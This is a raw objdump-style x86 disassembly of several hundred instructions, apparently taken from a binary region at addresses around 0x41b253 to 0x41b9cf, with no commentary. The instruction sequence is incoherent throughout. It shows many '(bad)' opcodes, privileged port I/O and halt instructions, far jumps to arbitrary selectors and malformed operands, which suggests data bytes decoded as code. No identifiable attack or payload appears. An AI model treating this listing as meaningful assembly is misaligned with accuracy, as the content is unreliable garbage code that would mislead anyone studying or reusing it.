  41b253:	sbb    al,0xd9
  41b256:	push   esi
  41b257:	xchg   edx,eax
  41b258:	or     eax,0xda5ff11d
  41b25d:	add    bh,BYTE PTR [esp+edi*8]
  41b260:	xchg   ebx,eax
  41b261:	std    
  41b262:	in     eax,0x5c
  41b264:	(bad)  
  41b265:	retf   0xa4d
  41b268:	int3   
  41b269:	retf   
  41b26a:	imul   esp,edi,0x50
  41b26d:	pop    eax
  41b26e:	add    esp,DWORD PTR [ecx+0x7a5f44e0]
  41b274:	loop   0x41b229
  41b276:	add    al,0xe7
  41b278:	lods   al,BYTE PTR ds:[esi]
  41b279:	and    edx,DWORD PTR [esp+edx*8-0x37f4a34a]
  41b280:	mov    ebx,DWORD PTR [edx+edi*2-0x4b]
  41b284:	mov    WORD PTR [esi+eiz*4],gs
  41b287:	out    dx,eax
  41b288:	hlt    
  41b289:	sbb    edi,DWORD PTR ds:0xac7a3a2c
  41b28f:	ins    BYTE PTR es:[edi],dx
  41b290:	into   
  41b291:	xchg   edx,eax
  41b292:	xor    dh,BYTE PTR [edx]
  41b294:	adc    ebp,edx
  41b296:	xchg   ecx,eax
  41b297:	dec    edx
  41b298:	push   esp
  41b299:	mov    dh,0xfc
  41b29b:	gs inc ebp
  41b29d:	xor    bh,cl
  41b29f:	fld    DWORD PTR ds:0xba776702
  41b2a5:	pop    esi
  41b2a6:	jge    0x41b2fb
  41b2a8:	sbb    ah,BYTE PTR [ebp-0x37]
  41b2ab:	hlt    
  41b2ac:	stc    
  41b2ad:	fucomp st(4)
  41b2af:	push   0xffffffc0
  41b2b1:	fwait
  41b2b2:	pushf  
  41b2b3:	pushf  
  41b2b4:	push   ss
  41b2b5:	es jp  0x41b30a
  41b2b8:	ret    
  41b2b9:	shl    DWORD PTR [ebp+0x7dbb0026],1
  41b2bf:	popf   
  41b2c0:	inc    esp
  41b2c1:	sbb    dl,ah
  41b2c3:	xor    al,0xed
  41b2c5:	push   edx
  41b2c6:	dec    edi
  41b2c7:	push   ss
  41b2c8:	jg     0x41b319
  41b2ca:	hlt    
  41b2cb:	fs add eax,0xe20fe881
  41b2d1:	dec    edi
  41b2d2:	sbb    al,0x75
  41b2d4:	fwait
  41b2d5:	pusha  
  41b2d6:	xor    eax,0x4da3b6e6
  41b2db:	mov    ds:0x434ed065,al
  41b2e0:	sbb    DWORD PTR [edx],ecx
  41b2e2:	aaa    
  41b2e3:	dec    edi
  41b2e4:	push   0x56
  41b2e6:	sub    al,cl
  41b2e8:	sub    BYTE PTR ds:0x28b28013,0x71
  41b2ef:	scas   eax,DWORD PTR es:[edi]
  41b2f0:	pop    edi
  41b2f1:	mov    ds:0x28609e3b,eax
  41b2f6:	inc    ebx
  41b2f7:	pusha  
  41b2f8:	out    dx,eax
  41b2f9:	pop    ecx
  41b2fa:	inc    eax
  41b2fb:	push   0xffffffbe
  41b2fd:	or     al,BYTE PTR [eax]
  41b2ff:	xor    DWORD PTR [ecx-0x4d03bf88],0xffffffda
  41b306:	xchg   DWORD PTR [ebx],esp
  41b308:	hlt    
  41b309:	lods   al,BYTE PTR ds:[esi]
  41b30a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b30b:	std    
  41b30c:	jecxz  0x41b358
  41b30e:	shr    DWORD PTR [edi-0x61ebdd46],cl
  41b314:	test   bl,cl
  41b316:	and    ch,BYTE PTR [ecx-0x48ed0da7]
  41b31c:	dec    esi
  41b31d:	hlt    
  41b31e:	stc    
  41b31f:	adc    DWORD PTR [eax+0x73],ebx
  41b322:	cwde   
  41b323:	and    eax,0x951da1dd
  41b328:	sub    BYTE PTR [ebx+ecx*2],ah
  41b32b:	jbe    0x41b384
  41b32d:	ret    0x8f5d
  41b330:	push   esp
  41b331:	sub    dl,cl
  41b333:	mov    bl,0x3b
  41b335:	sbb    BYTE PTR [eax+edx*4],cl
  41b338:	or     eax,0x9f40d278
  41b33d:	xchg   BYTE PTR [ebx+0x6f0f3814],ah
  41b343:	lock mov ch,al
  41b346:	push   ecx
  41b347:	imul   esp,DWORD PTR [ebp-0x5118e1d],0x99621e69
  41b351:	aad    0x13
  41b353:	test   BYTE PTR cs:[ebx],al
  41b356:	das    
  41b357:	add    al,BYTE PTR [esi+0x8]
  41b35a:	in     al,dx
  41b35b:	dec    ebx
  41b35c:	xor    al,0xf9
  41b35e:	xor    eax,0xb505733f
  41b363:	or     BYTE PTR [eax-0x118bf1e6],0xcc
  41b36a:	aas    
  41b36b:	sub    ebx,DWORD PTR [ebp+eiz*1-0x42]
  41b36f:	xor    esp,ecx
  41b371:	ror    DWORD PTR [ebx+esi*2-0x6479aff2],cl
  41b378:	les    edi,FWORD PTR [ecx+0xb]
  41b37b:	into   
  41b37c:	scas   al,BYTE PTR es:[edi]
  41b37d:	aad    0xfa
  41b37f:	jb     0x41b3f5
  41b381:	jns    0x41b3c4
  41b383:	sbb    ch,bl
  41b385:	shl    ebx,0xdf
  41b388:	mov    esp,0x31ac9a2b
  41b38d:	or     esp,DWORD PTR [ebp+0x45]
  41b390:	jecxz  0x41b3ba
  41b392:	shl    DWORD PTR [edi-0x5d],1
  41b395:	sub    esi,DWORD PTR [ebx]
  41b397:	jl     0x41b411
  41b399:	push   DWORD PTR es:[esi+0x6b]
  41b39d:	dec    ecx
  41b39e:	imul   eax,edi,0x63
  41b3a1:	stc    
  41b3a2:	or     BYTE PTR [ebx],0x61
  41b3a5:	add    DWORD PTR [ebx],eax
  41b3a7:	out    0x69,eax
  41b3a9:	ja     0x41b3b7
  41b3ab:	frstor [eax-0x4865f6fc]
  41b3b1:	push   ss
  41b3b2:	mov    BYTE PTR [esp+ecx*8-0x5900ae92],al
  41b3b9:	test   eax,0xaacb8333
  41b3be:	loope  0x41b43c
  41b3c0:	and    ah,BYTE PTR [ebp-0x68143038]
  41b3c6:	aam    0xb7
  41b3c8:	test   ah,bh
  41b3ca:	pop    edi
  41b3cb:	test   al,bl
  41b3cd:	scas   eax,DWORD PTR es:[edi]
  41b3ce:	out    0xd7,al
  41b3d0:	ds std 
  41b3d2:	test   DWORD PTR [edx],eax
  41b3d4:	jno    0x41b43c
  41b3d6:	add    eax,DWORD PTR [ebp-0x5d]
  41b3d9:	sub    eax,0xfd8821d1
  41b3de:	leave  
  41b3df:	fidiv  DWORD PTR [esi-0x7b]
  41b3e2:	mov    esi,0xd14e165c
  41b3e7:	repnz fdiv QWORD PTR [edx+0x5b0c6176]
  41b3ee:	inc    eax
  41b3ef:	out    dx,eax
  41b3f0:	cmp    DWORD PTR [eax],ebx
  41b3f2:	pop    edx
  41b3f3:	xchg   edi,eax
  41b3f4:	mov    esi,0x7658cd50
  41b3f9:	repnz pop ecx
  41b3fb:	(bad)  
  41b3fc:	jae    0x41b477
  41b3fe:	adc    BYTE PTR [esi],dl
  41b400:	add    DWORD PTR [ebx*8-0x68439e34],ecx
  41b407:	loopne 0x41b41d
  41b409:	imul   ebp,DWORD PTR [eax-0x21],0xbc40f9a5
  41b410:	jg     0x41b3aa
  41b412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b413:	(bad)  
  41b414:	fadd   QWORD PTR [esi-0x71a175e1]
  41b41a:	repz mov ah,0x81
  41b41d:	lahf   
  41b41e:	ret    
  41b41f:	addr16 jge 0x41b454
  41b422:	dec    BYTE PTR [edx+0xd177fbb]
  41b428:	cmp    ch,BYTE PTR [ebp+0xf]
  41b42b:	imul   esp,edi,0xfffffff8
  41b42e:	stos   DWORD PTR es:[edi],eax
  41b42f:	jp     0x41b3cd
  41b431:	cmp    eax,DWORD PTR [eax]
  41b433:	int3   
  41b434:	sub    DWORD PTR [esi+0x4b],ecx
  41b437:	and    BYTE PTR [esi+0x7980f592],0xb8
  41b43e:	je     0x41b465
  41b440:	or     ah,BYTE PTR gs:[bp+si-0x30]
  41b445:	fs push ebp
  41b447:	call   0xa129bb78
  41b44c:	mov    edx,0x806d6788
  41b451:	jno    0x41b3de
  41b453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b454:	test   eax,0xcd34527f
  41b459:	mov    dh,0x27
  41b45b:	repz mov eax,ds:0xa38b4490
  41b461:	jp     0x41b452
  41b463:	(bad)  
  41b464:	push   esi
  41b465:	loop   0x41b485
  41b467:	mov    ch,0x79
  41b469:	pop    esi
  41b46a:	fwait
  41b46b:	add    DWORD PTR [ecx],ecx
  41b46d:	fsubp  st(4),st
  41b46f:	into   
  41b470:	sti    
  41b471:	mov    ebp,0x3dc43df8
  41b476:	jge    0x41b43f
  41b478:	push   ss
  41b479:	(bad)  
  41b47a:	mov    al,ds:0x71f5ea79
  41b47f:	sar    ebp,0x71
  41b482:	add    DWORD PTR [eax+edi*2],ecx
  41b485:	es push edi
  41b487:	and    al,0xd3
  41b489:	push   ebp
  41b48a:	cmc    
  41b48b:	ret    0x8b2d
  41b48e:	mov    edx,DWORD PTR fs:[ebx+0x1b]
  41b492:	dec    edx
  41b493:	jne    0x41b45e
  41b495:	mov    dh,0x98
  41b497:	cmp    al,0xc8
  41b499:	int    0xb2
  41b49b:	arpl   WORD PTR [eax+edx*8+0x1aed2682],ax
  41b4a2:	pop    esp
  41b4a3:	inc    eax
  41b4a4:	mov    ebx,DWORD PTR [edx-0x11]
  41b4a7:	ja     0x41b500
  41b4a9:	cli    
  41b4aa:	jle    0x41b491
  41b4ac:	in     al,dx
  41b4ad:	jmp    0xe4fb:0x330e21ca
  41b4b4:	mov    ah,0x90
  41b4b6:	pop    esi
  41b4b7:	cmp    ah,BYTE PTR [esi-0x54]
  41b4ba:	mov    ?,WORD PTR [eax]
  41b4bc:	xabort 0x19
  41b4bf:	sar    ah,1
  41b4c1:	push   es
  41b4c2:	jbe    0x41b4f4
  41b4c4:	jbe    0x41b4bf
  41b4c6:	fimul  WORD PTR [ebp-0xbb906b8]
  41b4cc:	push   edx
  41b4cd:	add    ebx,ebp
  41b4cf:	cmp    al,0x8d
  41b4d1:	xchg   esp,eax
  41b4d2:	rcr    edi,1
  41b4d4:	shr    edi,cl
  41b4d6:	mov    edi,0x1fb48def
  41b4db:	stc    
  41b4dc:	pop    edi
  41b4dd:	cmp    eax,0xebfc7681
  41b4e2:	sahf   
  41b4e3:	inc    ecx
  41b4e4:	sub    al,0x56
  41b4e6:	mov    BYTE PTR [esi],ch
  41b4e8:	inc    edi
  41b4e9:	mov    ?,WORD PTR [eax-0x33]
  41b4ec:	pushw  0xf216
  41b4f0:	mov    al,0xc3
  41b4f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4f3:	fcomp  QWORD PTR [edx-0x7c]
  41b4f6:	mov    eax,0xd6072994
  41b4fb:	add    BYTE PTR [ebx],dh
  41b4fd:	ss pusha 
  41b4ff:	pop    ebx
  41b500:	push   eax
  41b501:	cmp    al,BYTE PTR [edx-0x348735aa]
  41b507:	xor    ebp,ebx
  41b509:	(bad)  
  41b50a:	loopne 0x41b51b
  41b50c:	test   eax,0xedeffcdc
  41b511:	push   0x8a30833a
  41b516:	cdq    
  41b517:	pushf  
  41b518:	inc    ebp
  41b519:	mov    ah,0x92
  41b51b:	iret   
  41b51c:	add    BYTE PTR [eax],dh
  41b51e:	sub    al,0x2a
  41b520:	jmp    0x41b4fa
  41b522:	fdiv   QWORD PTR [edi+edx*2+0x23]
  41b526:	xchg   ebp,eax
  41b527:	jno    0x41b50d
  41b529:	mov    bl,cl
  41b52b:	dec    ebx
  41b52c:	int3   
  41b52d:	pop    ss
  41b52e:	ins    DWORD PTR es:[edi],dx
  41b52f:	std    
  41b530:	ins    DWORD PTR es:[edi],dx
  41b531:	jb     0x41b575
  41b533:	in     al,dx
  41b534:	adc    eax,0xac536dd6
  41b539:	loope  0x41b4bb
  41b53b:	mov    BYTE PTR [ecx],bh
  41b53d:	push   es
  41b53e:	int    0xca
  41b540:	and    BYTE PTR [esi+0x2a934963],bl
  41b546:	cmp    ebx,esi
  41b548:	test   al,0xf0
  41b54a:	sub    ebp,DWORD PTR [edx]
  41b54c:	lea    esp,[ebx]
  41b54e:	sahf   
  41b54f:	sbb    eax,0x527ec8eb
  41b554:	mov    dh,0xc1
  41b556:	(bad)  
  41b557:	test   al,0x87
  41b559:	sub    ebp,DWORD PTR [esi+0x4f7036c0]
  41b55f:	aam    0x67
  41b561:	aam    0xdb
  41b563:	push   esi
  41b564:	stc    
  41b565:	jne    0x41b571
  41b567:	stos   DWORD PTR es:[edi],eax
  41b568:	addr16 sti 
  41b56a:	mov    bl,0xf4
  41b56c:	rcr    DWORD PTR [edi],cl
  41b56e:	xor    al,0xb0
  41b570:	jo     0xdca1f1e0
  41b576:	and    dh,ah
  41b578:	lock enter 0x4c30,0xcb
  41b57d:	sub    al,0xbd
  41b57f:	into   
  41b580:	into   
  41b581:	mov    ebx,0xfd77e622
  41b586:	bound  edi,QWORD PTR [eax+edx*1-0x4fccd4d2]
  41b58d:	and    ebx,DWORD PTR [edi-0x75f816eb]
  41b593:	scas   al,BYTE PTR es:[edi]
  41b594:	repz cmp eax,0xeb015e74
  41b59a:	ins    DWORD PTR es:[edi],dx
  41b59b:	cld    
  41b59c:	fstp   DWORD PTR [ecx-0x2b]
  41b59f:	clc    
  41b5a0:	pop    fs
  41b5a2:	dec    eax
  41b5a3:	popf   
  41b5a4:	xor    eax,0x116c3e95
  41b5a9:	push   esi
  41b5aa:	mov    bh,0x3e
  41b5ac:	jbe    0x41b5f5
  41b5ae:	xor    ecx,DWORD PTR [ebx+0x63]
  41b5b1:	psrad  mm0,QWORD PTR [ebx+0x10bd4af5]
  41b5b8:	test   al,0xfa
  41b5ba:	das    
  41b5bb:	loop   0x41b5d1
  41b5bd:	dec    edi
  41b5be:	nop
  41b5bf:	pusha  
  41b5c0:	ret    0x9cf0
  41b5c3:	jl     0x41b5c3
  41b5c5:	pop    ss
  41b5c6:	(bad)  [eax+0x19]
  41b5c9:	push   esp
  41b5ca:	(bad)  
  41b5cb:	xor    al,0x76
  41b5cd:	mov    bl,0x13
  41b5cf:	cld    
  41b5d0:	mov    ebp,0x9a63d19c
  41b5d5:	js     0x41b5f0
  41b5d7:	nop
  41b5d8:	sbb    al,0x4f
  41b5da:	adc    eax,0xa9912ab8
  41b5df:	ds pop eax
  41b5e1:	jo     0x41b63c
  41b5e3:	xor    eax,0x8efafe5
  41b5e8:	jne    0x41b612
  41b5ea:	popf   
  41b5eb:	dec    esi
  41b5ec:	les    edx,FWORD PTR [ebp+ebx*8+0x39]
  41b5f0:	or     eax,0x3001dcd5
  41b5f5:	dec    dl
  41b5f7:	clc    
  41b5f8:	ja     0x41b61d
  41b5fa:	jmp    0x41b5e9
  41b5fc:	mov    eax,ds:0x48b6f424
  41b601:	jne    0x41b588
  41b603:	dec    edx
  41b604:	cmp    al,0xbf
  41b606:	sti    
  41b607:	jge    0x41b5a9
  41b609:	mov    ebp,0xb5b3c439
  41b60e:	cli    
  41b60f:	cdq    
  41b610:	push   0xffffffb1
  41b612:	clc    
  41b613:	jmp    0x41b5c7
  41b615:	in     eax,dx
  41b616:	inc    ecx
  41b617:	gs inc ebp
  41b619:	or     eax,0x45f072e4
  41b61e:	adc    esp,DWORD PTR [ecx-0x6fc3f5f4]
  41b624:	call   0xbd2b:0x7c05e5bd
  41b62b:	jle    0x41b5d3
  41b62d:	or     al,BYTE PTR [ebx-0x1f9a296f]
  41b633:	sub    eax,0x1a45b4ea
  41b638:	daa    
  41b639:	push   ebx
  41b63a:	cmp    edx,DWORD PTR [edi-0x80]
  41b63d:	sub    BYTE PTR [ecx+0x34],0xd7
  41b641:	scas   al,BYTE PTR es:[edi]
  41b642:	sar    DWORD PTR [esi+esi*1+0x7d],0xe3
  41b647:	call   0x31a5bcd
  41b64c:	push   edi
  41b64d:	mov    ebp,0x1befd05
  41b652:	shl    BYTE PTR [ebp-0x4001cd8b],1
  41b658:	imul   edx,eax,0x2f757f75
  41b65e:	xchg   ecx,eax
  41b65f:	cli    
  41b660:	gs push esi
  41b662:	inc    ebp
  41b663:	push   es
  41b664:	iret   
  41b665:	push   ebx
  41b666:	cdq    
  41b667:	rcr    DWORD PTR [edi+0x72],0x2f
  41b66b:	not    BYTE PTR [esi-0xc]
  41b66e:	and    bh,BYTE PTR [ebx]
  41b670:	mov    esi,0x2b46fb03
  41b675:	lea    cx,[eax]
  41b678:	mov    ds:0xdf2ad285,eax
  41b67d:	cmp    al,dh
  41b67f:	ret    0x434c
  41b682:	sub    dl,BYTE PTR es:[ebx]
  41b685:	dec    edi
  41b686:	jnp    0x41b6af
  41b688:	inc    eax
  41b689:	imul   DWORD PTR [esi-0x43d35f67]
  41b68f:	arpl   WORD PTR [esi],ax
  41b691:	sbb    DWORD PTR [ebp-0x4],0xeb81c4d5
  41b698:	mov    cl,0xed
  41b69a:	scas   al,BYTE PTR es:[edi]
  41b69b:	(bad)  
  41b69c:	ret    0x566e
  41b69f:	pop    ss
  41b6a0:	mov    bl,0xa6
  41b6a2:	sbb    eax,0xd310060
  41b6a7:	cmp    eax,0xe675ae7c
  41b6ac:	scas   eax,DWORD PTR es:[edi]
  41b6ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6ae:	add    DWORD PTR [edi+0x20],eax
  41b6b1:	xchg   edi,esp
  41b6b3:	in     eax,0x55
  41b6b5:	jae    0x41b724
  41b6b7:	dec    edi
  41b6b8:	sti    
  41b6b9:	lea    ebp,ds:0xbdd5e23a
  41b6bf:	loope  0x41b72a
  41b6c1:	outs   dx,DWORD PTR ds:[esi]
  41b6c2:	leave  
  41b6c3:	jmp    DWORD PTR [ebx-0x5e]
  41b6c6:	mov    WORD PTR [ecx+0x44],gs
  41b6c9:	mov    ebx,edi
  41b6cb:	add    eax,0x434f133a
  41b6d0:	and    DWORD PTR [ebp-0x61],ebx
  41b6d3:	std    
  41b6d4:	rcr    BYTE PTR [ebx],0x92
  41b6d7:	clc    
  41b6d8:	mov    ebp,eax
  41b6da:	imul   edx,DWORD PTR [edx-0x8059e43],0x53
  41b6e1:	xor    edi,edx
  41b6e3:	(bad)  ds:0xfc911da1
  41b6e9:	lock int3 
  41b6eb:	sub    dl,BYTE PTR [edx+edi*8+0x29]
  41b6ef:	dec    esi
  41b6f0:	push   es
  41b6f1:	ret    0x7c46
  41b6f4:	pextrw edi,(bad),0xc5
  41b6f6:	jg     0x41b68d
  41b6f8:	scas   al,BYTE PTR es:[edi]
  41b6f9:	sbb    al,0x81
  41b6fb:	mov    WORD PTR [ecx-0x2773db96],ss
  41b701:	dec    ebx
  41b702:	and    al,0x65
  41b704:	adc    esp,DWORD PTR [ecx+0x69c50b8b]
  41b70a:	inc    eax
  41b70b:	jl     0x41b6ee
  41b70d:	pushf  
  41b70e:	or     eax,0x5e2baaca
  41b713:	test   eax,0x7d998ed2
  41b718:	dec    ecx
  41b719:	lock mov bl,0x41
  41b71c:	xor    BYTE PTR [eax-0x58f50fa6],al
  41b722:	sbb    DWORD PTR [ebp-0xfae13a1],ebx
  41b728:	xchg   dl,bh
  41b72a:	or     DWORD PTR [esi+0x22bb0595],ecx
  41b730:	outs   dx,BYTE PTR ds:[esi]
  41b731:	mov    BYTE PTR [esi+0x5a70fa64],ah
  41b737:	cmp    DWORD PTR [ebp+0x433e4ef4],0xffffffc3
  41b73e:	jae    0x41b6df
  41b740:	cs mov dh,0xc
  41b743:	repz push edi
  41b745:	mov    edx,0xabfdf24
  41b74a:	mov    ebp,0x2e5281c2
  41b74f:	mov    eax,DWORD PTR [ebx+eax*1]
  41b752:	inc    edx
  41b753:	sub    BYTE PTR [ecx-0x47],dh
  41b756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b757:	or     BYTE PTR [ebx+ebp*1-0x37d0a3cc],bh
  41b75e:	mov    esi,0xc2020109
  41b763:	imul   esi,DWORD PTR [esp+eax*4-0xdb25a56],0x77
  41b76b:	xchg   esi,eax
  41b76c:	repnz outs dx,BYTE PTR ds:[esi]
  41b76e:	aas    
  41b76f:	imul   ebx,DWORD PTR [eax+ebx*2-0x38488ba],0xf6c505e5
  41b77a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b77b:	lea    edx,[edi+0x30]
  41b77e:	cwde   
  41b77f:	cmp    eax,0xca1b7cba
  41b784:	xchg   DWORD PTR [eax+0x5bde096f],ecx
  41b78a:	rol    BYTE PTR [esi],1
  41b78c:	fbld   TBYTE PTR [edi]
  41b78e:	mov    ds:0x1ba9f3b6,eax
  41b793:	dec    esp
  41b794:	repz cwde 
  41b796:	jne    0x41b790
  41b798:	call   0x17d19e05
  41b79d:	nop
  41b79e:	xchg   BYTE PTR [ebx+0xbba371d],cl
  41b7a4:	sub    esp,ebp
  41b7a6:	outs   dx,BYTE PTR ds:[esi]
  41b7a7:	stos   BYTE PTR es:[edi],al
  41b7a8:	sbb    al,0xd4
  41b7aa:	ss ins BYTE PTR es:[edi],dx
  41b7ac:	lds    edx,FWORD PTR [ecx]
  41b7ae:	cmp    al,0xfc
  41b7b0:	dec    esi
  41b7b1:	hlt    
  41b7b2:	jmp    0x3748:0x37442f83
  41b7b9:	sub    DWORD PTR ds:0xad2a2c82,0x5f
  41b7c0:	fld    QWORD PTR [ebx+0x15]
  41b7c3:	iret   
  41b7c4:	or     ah,BYTE PTR [esi+ecx*8-0x13e86489]
  41b7cb:	pusha  
  41b7cc:	add    edi,DWORD PTR [edi+0x7f8dc9be]
  41b7d2:	retf   
  41b7d3:	adc    DWORD PTR [ebp+0x31],ebp
  41b7d6:	dec    ebp
  41b7d7:	sbb    bh,BYTE PTR [edx]
  41b7d9:	pop    edx
  41b7da:	mov    dl,0xc5
  41b7dc:	fwait
  41b7dd:	adc    BYTE PTR [edx],0xbe
  41b7e0:	ss test eax,0xfef5757b
  41b7e6:	rcr    bh,1
  41b7e8:	sbb    al,0xaa
  41b7ea:	and    dl,dh
  41b7ec:	stos   BYTE PTR es:[edi],al
  41b7ed:	sbb    BYTE PTR [esi+ebp*1],bl
  41b7f0:	add    edi,esp
  41b7f2:	and    DWORD PTR [edi-0x1],esi
  41b7f5:	mov    bh,0xe2
  41b7f7:	sbb    edi,eax
  41b7f9:	sti    
  41b7fa:	inc    esi
  41b7fb:	sub    cl,BYTE PTR [ecx]
  41b7fd:	xor    al,0x46
  41b7ff:	fwait
  41b800:	hlt    
  41b801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b802:	inc    ecx
  41b803:	pop    ebx
  41b804:	test   al,0xcd
  41b806:	inc    ecx
  41b807:	lods   al,BYTE PTR ds:[esi]
  41b808:	or     ebx,0x33dc2ac0
  41b80e:	ror    eax,cl
  41b810:	aad    0xaf
  41b812:	jle    0x41b81a
  41b814:	(bad)  
  41b815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b816:	test   BYTE PTR [ecx-0xc],ah
  41b819:	mov    edi,cs
  41b81b:	inc    edx
  41b81c:	out    dx,eax
  41b81d:	call   0x2573c89b
  41b822:	mov    bh,0xdd
  41b824:	and    DWORD PTR [edx-0x1abd452e],ecx
  41b82a:	pop    ebx
  41b82b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b82c:	inc    esp
  41b82d:	cmp    al,0x12
  41b82f:	jmp    0x41b82e
  41b831:	mov    esi,0xc208063d
  41b836:	aas    
  41b837:	loop   0x41b840
  41b839:	push   ss
  41b83a:	or     eax,eax
  41b83c:	cli    
  41b83d:	faddp  st(3),st
  41b83f:	push   esi
  41b840:	or     BYTE PTR [edi],dl
  41b842:	adc    DWORD PTR [ebp+esi*1+0x2f],edx
  41b846:	sahf   
  41b847:	or     al,0x78
  41b849:	(bad)  
  41b84a:	push   esi
  41b84b:	hlt    
  41b84c:	adc    edx,DWORD PTR [esi+esi*1+0x7ee81683]
  41b853:	mov    ah,0x9e
  41b855:	or     bh,BYTE PTR [eax-0x621a283d]
  41b85b:	fcom   DWORD PTR [edx-0x1cf65bac]
  41b861:	call   0xf833:0xb51bea0c
  41b868:	dec    edi
  41b869:	imul   ecx,ebp,0x82b2113f
  41b86f:	xchg   ebx,eax
  41b870:	mov    dh,0xe7
  41b872:	loopne 0x41b8a0
  41b874:	push   edi
  41b875:	cmc    
  41b876:	les    ebx,FWORD PTR [edx+ebx*1+0x25]
  41b87a:	sar    edi,0xb8
  41b87d:	push   ds
  41b87e:	mov    al,ds:0xb0ff866b
  41b883:	bound  esi,QWORD PTR [ebx+0x0]
  41b886:	add    bh,BYTE PTR [ebx]
  41b888:	or     dl,BYTE PTR [edx-0x5cba6616]
  41b88e:	in     ax,0xf8
  41b891:	cmc    
  41b892:	xor    edi,ebp
  41b894:	imul   esi,DWORD PTR [ebp+0x13],0xffffffa4
  41b898:	jns    0x41b82c
  41b89a:	sub    al,0x91
  41b89c:	mov    ebp,0xe778a0bc
  41b8a1:	into   
  41b8a2:	lahf   
  41b8a3:	loopne 0x41b8fd
  41b8a5:	xchg   edx,eax
  41b8a6:	and    DWORD PTR es:0x849258f4,ecx
  41b8ad:	ins    DWORD PTR es:[edi],dx
  41b8ae:	push   ds
  41b8af:	cld    
  41b8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8b1:	push   es
  41b8b2:	outs   dx,DWORD PTR ds:[esi]
  41b8b3:	ret    0xa7ef
  41b8b6:	cwde   
  41b8b7:	ret    
  41b8b8:	js     0x41b873
  41b8ba:	je     0x41b8b0
  41b8bc:	add    bh,bh
  41b8be:	mov    esp,0xdc3b2bfa
  41b8c3:	pop    eax
  41b8c4:	sbb    dh,BYTE PTR [esi-0x27]
  41b8c7:	pop    ebx
  41b8c8:	cmp    ah,bl
  41b8ca:	mov    ah,0x16
  41b8cc:	adc    ebp,DWORD PTR [ebx-0x11]
  41b8cf:	adc    BYTE PTR [ebx+0xbaacfd0],ch
  41b8d5:	gs shr dl,1
  41b8d8:	adc    DWORD PTR [edi+0x6f37bf25],esp
  41b8de:	fs stos DWORD PTR es:[edi],eax
  41b8e0:	push   es
  41b8e1:	in     al,0xfa
  41b8e3:	icebp  
  41b8e4:	add    al,0x22
  41b8e6:	mov    dl,0x7f
  41b8e8:	jns    0x41b8a8
  41b8ea:	pop    ecx
  41b8eb:	jl     0x41b8e6
  41b8ed:	ret    0xa245
  41b8f0:	popf   
  41b8f1:	aad    0x48
  41b8f3:	mov    bl,0x12
  41b8f5:	outs   dx,DWORD PTR ds:[esi]
  41b8f6:	push   eax
  41b8f7:	fisub  DWORD PTR [edi]
  41b8f9:	push   ss
  41b8fa:	test   al,0x9d
  41b8fc:	jae    0x41b930
  41b8fe:	mov    DWORD PTR [esi-0xd2cac96],0x7b110c04
  41b908:	mov    al,0x28
  41b90a:	cdq    
  41b90b:	pop    ebp
  41b90c:	jp     0x41b942
  41b90e:	add    BYTE PTR ds:0x54e87892,0x53
  41b915:	add    eax,ecx
  41b917:	adc    DWORD PTR [ebx-0x5b9aab56],edx
  41b91d:	sbb    BYTE PTR [edx],al
  41b91f:	std    
  41b920:	repz mov esp,0x216e4676
  41b926:	push   cs
  41b927:	sub    BYTE PTR [edx+0x4f80c3ed],ch
  41b92d:	jb     0x41b906
  41b92f:	mov    ds:0xf172ad8c,al
  41b934:	lods   eax,DWORD PTR ss:[esi]
  41b936:	out    0x1d,al
  41b938:	xchg   ecx,eax
  41b939:	loop   0x41b9b5
  41b93b:	or     al,0xb
  41b93d:	push   ds
  41b93e:	(bad)  
  41b93f:	mov    ch,0x9a
  41b941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b942:	cli    
  41b943:	(bad)  
  41b944:	ficomp WORD PTR ds:0x59492255
  41b94a:	mov    eax,ds:0x69943480
  41b94f:	jmp    0x41b975
  41b951:	mov    WORD PTR [esi],ss
  41b953:	xchg   edx,eax
  41b954:	mov    al,ds:0xe1321673
  41b959:	dec    ebx
  41b95a:	pop    edi
  41b95b:	dec    ecx
  41b95c:	mov    bh,0x40
  41b95e:	pop    ds
  41b95f:	add    ecx,DWORD PTR [ebx]
  41b961:	into   
  41b962:	lea    eax,[ecx]
  41b964:	ret    0x1403
  41b967:	sub    BYTE PTR [esi+ebx*2-0xc],bl
  41b96b:	jmp    0x1f86:0x6c01ccc1
  41b972:	int    0x59
  41b974:	xchg   ecx,eax
  41b975:	xlat   BYTE PTR ds:[ebx]
  41b976:	pushf  
  41b977:	pusha  
  41b978:	cmp    al,BYTE PTR [ecx]
  41b97a:	into   
  41b97b:	sbb    ch,BYTE PTR [ebx]
  41b97d:	repz int3 
  41b97f:	call   0x6fbb:0xe3b7bd59
  41b986:	ja     0x41b986
  41b988:	outs   dx,BYTE PTR ds:[esi]
  41b989:	scas   eax,DWORD PTR es:[edi]
  41b98a:	xchg   eax,edi
  41b98c:	fsubp  st(2),st
  41b98e:	loop   0x41b94a
  41b990:	mov    ds:0x9979a00,eax
  41b995:	inc    ecx
  41b996:	sub    al,0x72
  41b998:	sbb    BYTE PTR [edx+esi*1-0x2d],al
  41b99c:	push   ecx
  41b99d:	aaa    
  41b99e:	(bad)  [edx-0x74]
  41b9a1:	and    BYTE PTR [eax-0x463e262e],ch
  41b9a7:	add    eax,0xcaaa51ff
  41b9ac:	sub    al,0x3f
  41b9ae:	int    0x83
  41b9b0:	ss sahf 
  41b9b2:	and    DWORD PTR [ebx-0x21],eax
  41b9b5:	ja     0x41ba07
  41b9b7:	mov    gs,WORD PTR [ebx-0x33783e89]
  41b9bd:	repz data16 xor al,0x6f
  41b9c1:	out    dx,al
  41b9c2:	rcl    bl,0x23
  41b9c5:	add    BYTE PTR [ecx+ebp*4+0x7d99a30d],ah
  41b9cc:	fiadd  DWORD PTR [edi-0x4a]
  41b9cf:	xlat   BYTE PTR ds:[ebx]
